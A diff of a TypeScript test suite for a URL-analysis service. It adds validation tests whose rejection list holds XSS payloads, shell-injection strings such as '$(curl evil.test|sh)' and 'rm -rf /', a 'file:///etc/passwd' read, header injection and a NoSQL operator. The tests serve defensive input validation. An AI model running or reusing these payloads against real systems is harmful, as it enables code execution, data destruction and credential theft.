@@ -22,6 +22,10 @@ import {
   AnalysisQueueCapacityExceededError
 } from '../../../src/core/errors/DomainErrors.js';
 
+function getLocalDateForTest(): string {
+  return new Intl.DateTimeFormat('en-CA', { timeZone: 'America/Mexico_City', year: 'numeric', month: '2-digit', day: '2-digit' }).format(new Date());
+}
+
 describe('Auth & Analysis Use Cases', () => {
   let userRepo: MockUserRepository;
   let tokenRepo: MockRefreshTokenRepository;
@@ -246,23 +250,57 @@ describe('Auth & Analysis Use Cases', () => {
       assert.equal(quotaRejectionAudit, undefined);
     });
 
-    it('persists the complete accepted input through the 64 KiB boundary and rejects larger input before quota admission', async () => {
+    it('acepta un enlace hasta 2048 caracteres y rechaza uno más largo antes de consumir cuota', async () => {
       const submitUseCase = new SubmitAnalysisUseCase(dailyRepo, auditRepo, 'America/Mexico_City', 5);
       const userId = 'user-large-input';
       const prefix = 'https://example.test/';
-      const input = prefix + 'x'.repeat(65_536 - Buffer.byteLength(prefix, 'utf8'));
+      const input = prefix + 'x'.repeat(2048 - prefix.length);
 
       const admission = await submitUseCase.execute({ userId, input });
       const stored = await dailyRepo.findAttemptByLocalKey(userId, admission.localDate, admission.attemptId);
-      assert.equal(stored?.attempt.inputSizeBytes, 65_536);
+      assert.equal(stored?.attempt.inputSizeBytes, 2048);
       assert.equal(stored?.attempt.submittedInput, input);
 
-      await assert.rejects(
-        () => submitUseCase.execute({ userId, input: `${input}x` }),
-        ValidationError
-      );
+      await assert.rejects(() => submitUseCase.execute({ userId, input: `${input}x` }), ValidationError);
       const daily = await dailyRepo.findDailyAnalysis(userId, admission.localDate);
       assert.equal(daily?.attemptsCount, 1, 'oversized input must be rejected before consuming quota');
+    });
+
+    it('rechaza scripts, comandos y cualquier cosa que no sea un enlace http(s) limpio, sin consumir cuota', async () => {
+      const submitUseCase = new SubmitAnalysisUseCase(dailyRepo, auditRepo, 'America/Mexico_City', 5);
+      const userId = 'user-injection';
+      const attacks = [
+        '<script>alert(1)</script>',
+        'javascript:alert(document.cookie)',
+        'https://example.test/"><script>alert(1)</script>',
+        "https://example.test/'onmouseover='alert(1)",
+        'https://example.test/`rm -rf /`',
+        'https://example.test/; rm -rf /',
+        'https://example.test/$(curl evil.test|sh)',
+        '$(curl evil.test | sh)',
+        'data:text/html,<h1>x</h1>',
+        'file:///etc/passwd',
+        'https://user:pass@example.test/',
+        'https://exa mple.test/',
+        'https://example.test/\u0000',
+        'https://example.test/path\nSet-Cookie: x=1',
+        'ftp://example.test/',
+        'https://exa_mple.test/',
+        '{"$gt": ""}',
+        'hola, revisa esto'
+      ];
+      for (const input of attacks) {
+        await assert.rejects(() => submitUseCase.execute({ userId, input }), ValidationError, input);
+      }
+      assert.equal(await dailyRepo.findDailyAnalysis(userId, getLocalDateForTest()), null);
+    });
+
+    it('acepta enlaces normales, con parámetros, IP, puerto y dominios internacionales', async () => {
+      const submitUseCase = new SubmitAnalysisUseCase(dailyRepo, auditRepo, 'America/Mexico_City', 5);
+      for (const input of ['https://www.banamex.com/', 'http://123.4.132.174/login?next=/cuenta&x=1#top',
+        'https://example.test:8443/a/b', 'https://xn--bcher-kva.example/', 'https://chafael.github.io/enlaceseguro-demo/banco/']) {
+        await submitUseCase.execute({ userId: `user-ok-${input.length}`, input });
+      }
     });
 
     it('maps a full global queue to a retryable service error without auditing or consuming daily quota', async () => {
